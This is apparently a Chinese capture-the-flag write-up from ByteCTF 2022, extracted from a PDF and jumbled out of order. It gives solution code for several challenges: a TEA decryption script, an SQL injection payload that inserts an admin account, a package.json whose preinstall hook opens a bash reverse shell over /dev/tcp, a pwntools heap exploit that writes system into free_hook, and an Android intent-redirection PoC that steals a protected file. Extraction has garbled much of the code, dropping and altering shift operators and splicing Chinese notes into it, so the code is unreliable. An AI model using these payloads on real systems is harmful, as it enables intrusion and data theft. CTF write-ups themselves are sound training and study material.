var4 ~ ((temp14 & 0xffffffff) >> 0x05) + (storage[0x00] / 0x0100 
** 0x04 & 0xffffffff)); 
                        var5 = temp15; 
                        var6 = temp14 + (((var5 & 0xffffffff) > 0x05) + (storage[0x00] / 0x0100 
** 0x0c & 0xffffffff)); 
                        var7 = var7 + 0x01; 
                        if (var7 & 0xff >= 0x20) { goto 
label_047F; } 
                        else { goto label_03E1; } 
                    } 
                } else { 
                label_034E: 
                    var temp16 = var7; 
                    var8 = 0x03 - temp16 * 0x08 & 0xff; 
                    var9 = var0; 
                    var10 = var3 + (temp16 & 0xff); 
                    if (var10 >= memory[var9:var9 + 0x20]) { 
assert(); } 
                    var5 = var5 + (((((memory[var10 + 0x20 + 
var9:var10 + 0x20 + var9 + 0x20] >> 0xf8) > 0xf8) & 
0xff) = memory[var9:var9 + 0x20]) { 
assert(); } 
                    var6 = var6 + (((((memory[var10 + 0x20 + 
var9:var10 + 0x20 + var9 + 0x20] >> 0xf8) > 0xf8) & 
0xff) = 0x04) { goto label_03CD; 
} 
                    else { goto label_034E; } 
                } 
            } 
        } else { 
            var temp18 = var3; 
            memory[var2 + 0x20:var2 + 0x20 + temp18] = 
code[code.length:code.length + temp18]; 
            var1 = var2; 
            var2 = 0xdeadbeef; 
            var3 = 0x00; 
            if (var3 >= memory[var0:var0 + 0x20]) { goto 
label_0563; } 
            else { goto label_032D; } 
        } 
    } 
    function func_0205(var arg0, var arg1) { 
        var temp0 = arg0; 
        var temp1 = temp0 + 0x20; 
        arg0 = msg.data[temp0:temp0 + 0x20] & 0xffffffff; 
        var temp2 = temp1 + 0x20; 
        arg1 = msg.data[temp1:temp1 + 0x20] & 0xffffffff; 
        var var0 = msg.data[temp2:temp2 + 0x20] & 0xffffffff; 
        var var1 = msg.data[temp2 + 0x20:temp2 + 0x20 + 0x20] & 
0xffffffff; 
        storage[0x00] = (arg0 & 0xffffffff) | (storage[0x00] & 
~0xffffffff); 
        storage[0x00] = (arg1 & 0xffffffff) * 0x0100 ** 0x04 | 
(storage[0x00] & ~(0xffffffff * 0x0100 ** 0x04)); 
        storage[0x00] = (var0 & 0xffffffff) * 0x0100 ** 0x08 | 
(storage[0x00] & ~(0xffffffff * 0x0100 ** 0x08)); 
        storage[0x00] = (var1 & 0xffffffff) * 0x0100 ** 0x0c | 
(storage[0x00] & ~(0xffffffff * 0x0100 ** 0x0c)); 
    } 
    function k1() returns (var r0) { return storage[0x00] / 
0x0100 ** 0x04 & 0xffffffff; } 
    function func_056F() returns (var r0) { return storage[0x00] 
& 0xffffffff; } 
    function k2() returns (var r0) { return storage[0x00] / 
0x0100 ** 0x08 & 0xffffffff; } 
    function func_0623() returns (var r0) { return storage[0x00] 
/ 0x0100 ** 0x0c & 0xffffffff; } 
} 
from ctypes import * 
from binascii import unhexlify 
def decipher(v, k): 
PYTHON
注册时sql注入，插一个admin用户进去
    y = c_uint32(v[0]) 
    z = c_uint32(v[1]) 
    sum = c_uint32(0xd5b7dde0) 
    delta = 0xdeadbeef 
    n = 32 
    w = [0,0] 
    while(n>0): 
        z.value -= ( y.value > 5 ) + k[3] 
        y.value -= ( z.value > 5 ) + k[1] 
        sum.value -= delta 
        n -= 1 
    w[0] = y.value 
    w[1] = z.value 
    return w 
if __name__ == "__main__": 
    key = [0x44332211, 0xaabbccdd, 0x87654321, 0x12345678][::-1] 
    cipher = 
"a625e97482f83d2b7fc5125763dcbbffd8115b208c4754eee8711bdfac9e337
7622bbf0cbb785e612b82c7f5143d5333" 
    flag = '' 
    for i in range(0, len(cipher), 16): 
        v = [int(cipher[i:i+8], 16), int(cipher[i+8:i+16], 16)] 
        dec = decipher(v,key) 
        flag += hex(dec[0])[2:].zfill(8) + hex(dec[1])
[2:].zfill(8) 
    print(unhexlify(flag)) 
ctf_cloud
登录后传一个package.json，利用preinstall执行命令
然后传一个依赖
最后npm i
{"username":"4","password":"1', 0),('admin','123',1); -- "} 
POST /dashboard/upload 
Content-Disposition: form-data; name="file"; 
filename="package.json" 
{ 
    "name": "userapp", 
    "version": "0.0.1", 
    "dependencies": { 
    }, 
    "scripts": { 
        "preinstall":"bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" 
    } 
} 
POST /dashboard/dependencies 
{"dependencies":{ 
"npm_test": "file:///usr/local/app/public/app/public/uploads/"}} 
POST /dashboard/run 
Choose_U_Flag
from pwn import * 
import numpy as np 
from sympy import ZZ, Poly 
PYTHON
0xD0A0存了一个奇怪地址 [anon_7faa3edaf] +0x54a8 ，这个在libc后面的一块
mmap区域里面。
fs= 0x7faa3eb91740
ptr=0x7faa3edb44a8
Case4:
from sympy.abc import x 
from ast import literal_eval 
#  
io = process(['./wscat', '--endpoint', 
'wss://telnet.2022.capturetheflag.fun/ws/be3e3d8bbd31e290dcf256d
918856c1b']) 
N = 107 
R_poly = Poly(x ** N - 1, x).set_domain(ZZ) 
io.recvuntil(b'key coeffs: ') 
key_coeffs = literal_eval(io.recvline().decode().strip()) 
key_poly = Poly(key_coeffs, x).set_domain(ZZ) 
my_poly = key_poly + R_poly 
my_coeffs = my_poly.all_coeffs() 
io.sendlineafter(b'decrypt data >', str(my_coeffs).encode()) 
io.recvuntil(b'decrypt coeffs: ') 
decrypt_result = literal_eval(io.recvline().decode().strip()) 
decrypt_result = [0] * (96-len(decrypt_result)) + decrypt_result 
res = np.packbits(decrypt_result).tobytes() 
io.sendlineafter(b'u key > ', res) 
io.interactive() 
mini_http2
里面调用了两次mywrite，会把0xD0AC的值（4字节）打印出来
一些验证：
Case4暂时没看到洞，作用应该是设置（settings）
libc 2.35。
有堆地址泄漏和堆溢出写。但是堆环境比较复杂。
libc也有泄漏，需要根据泄漏的libc地址，算出上面的奇怪偏移，然后写入system。
username填/bin/sh应该就行了。
这个奇怪地址是 free_hook，leak libc就能知道这个地址，如果能任意地址申请，申
请到这上面然后改成system，再调用myexit就行
S1:PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n 
ptr[3] == 4 
stack_var[0] >12))[:6] 
pay=b'{"name":"'+b'a'*(0xb0-
0x20)+ptr+b'","desc":"b","worker_idx":0}' 
p.send(do_req_83(b'/api/edit_worker',pay)) 
p.send(do_req_83(b'/api/del_worker',b'{"worker_idx":0}')) 
rcvout() 
#input() 
#pay=json.dumps({"name":'c'*0x80,'desc':'d'*0x78+p64(libc.sym['s
ystem'])}).encode() 
pay=b'{"name":"'+b'c'*0x80+b'","desc":"'+b'd'*0x78+p64(libc.sym[
'system'])[:6]+b'"}' 
p.send(do_req_83(b'/api/add_worker',pay)) 
print(rcvout()) # leak heap addr 
intent 重定向，利用 startActivityForResult 获取返回经过授权的 intent
#p.send(do_req_83(b'/api/add_worker',pay)) 
#print(rcvout()) # leak heap addr 
#input() 
p.send(do_req_82(b'/exit')) 
#p.send(do_req_83(b'/api/edit_worker',pay)) 
#print(rcvout()) 
#p.send(do_req_83(b'/api/show_worker',b'{"worker_idx":0}')) 
#print(rcvout()) 
p.interactive() 
Bronze Droid
public class MainActivity extends AppCompatActivity { 
    private void getFlag() { 
        String pwnUri = 
"content://com.bytectf.bronzedroid.fileprovider/root/data/data/c
om.bytectf.bronzedroid/files/flag"; 
        Intent evil = new Intent("ACTION_SHARET_TO_ME"); 
        evil.setClassName("com.bytectf.bronzedroid", 
"com.bytectf.bronzedroid.MainActivity"); 
        evil.setData(Uri.parse(pwnUri)); 
        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | 
Intent.FLAG_GRANT_WRITE_URI_PERMISSION); 
        Log.d("CTF1", "flags:" + evil.getFlags()); 
        startActivityForResult(evil, 3); 
    } 
    @Override 
    protected void onActivityResult(int requestCode, int 
resultCode, @Nullable Intent data) { 
        super.onActivityResult(requestCode, resultCode, data); 
JAVA
        Log.d("CTF1", "flags:" + data.getFlags()); 
        Uri data1 = data.getData(); 
        try { 
            InputStreamReader isr = new 
InputStreamReader(getContentResolver().openInputStream(data1)); 
            char[] buf = new char[1024]; 